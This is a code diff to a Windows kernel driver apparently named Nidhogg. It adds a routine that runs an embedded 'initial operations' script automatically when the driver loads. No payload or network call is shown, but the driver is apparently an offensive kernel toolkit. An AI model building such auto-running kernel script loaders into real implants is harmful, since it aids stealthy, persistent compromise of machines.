@@ -123,6 +123,8 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;
 
+	ExecuteInitialOperations();
+
 	Print(DRIVER_PREFIX "Initialization finished.\n");
 	return status;
 }
@@ -159,6 +161,49 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
 	IoDeleteSymbolicLink(&symbolicLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
+}
+
+/*
+* Description:
+* ExecuteInitialOperations is responsible for executing initial opeartions script.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ExecuteInitialOperations() {
+	ScriptManager* scriptManager = nullptr;
+	ScriptInformation scriptInfo{};
+
+	if (InitialOperationsSize == 0 || !InitialOperations)
+		return;
+
+	scriptInfo.ScriptSize = InitialOperationsSize;
+	MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
+	NTSTATUS status = scriptAllocator.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);
+
+	if (!NT_SUCCESS(status))
+		return;
+
+	__try {
+		scriptManager = new ScriptManager();
+		status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = GetExceptionCode();
+	}
+
+	if (scriptManager) {
+		delete scriptManager;
+		scriptManager = nullptr;
+	}
+
+	if (!NT_SUCCESS(status))
+		Print(DRIVER_PREFIX "Failed to execute initial operations (0x%08X)\n", status);
+	else
+		Print(DRIVER_PREFIX "Executed initial opeartions successfully.\n");
 }
 
 /*
